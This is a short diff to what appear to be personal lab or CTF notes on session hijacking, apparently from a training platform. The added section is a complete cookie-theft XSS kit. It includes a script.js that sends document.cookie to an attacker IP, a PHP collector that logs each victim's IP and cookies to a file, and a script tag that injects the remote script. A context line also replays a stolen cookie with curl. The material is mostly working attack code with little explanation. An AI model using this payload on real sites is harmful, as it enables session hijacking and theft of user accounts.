@@ -412,7 +412,30 @@ curl -H "Cookie: cookie=c00k1355h0u1d8353cu23d" http://10.129.234.166/hijacking/
 
 
 
-#
+# SA 
+
+```
+cat script.js 
+new Image().src='http://10.10.17.198/index.php?c='+document.cookie;
+
+cat index.php 
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+
+```
+
+```
+<script src=http://10.10.17.198/script.js></script>
+```
 #
 #
 #
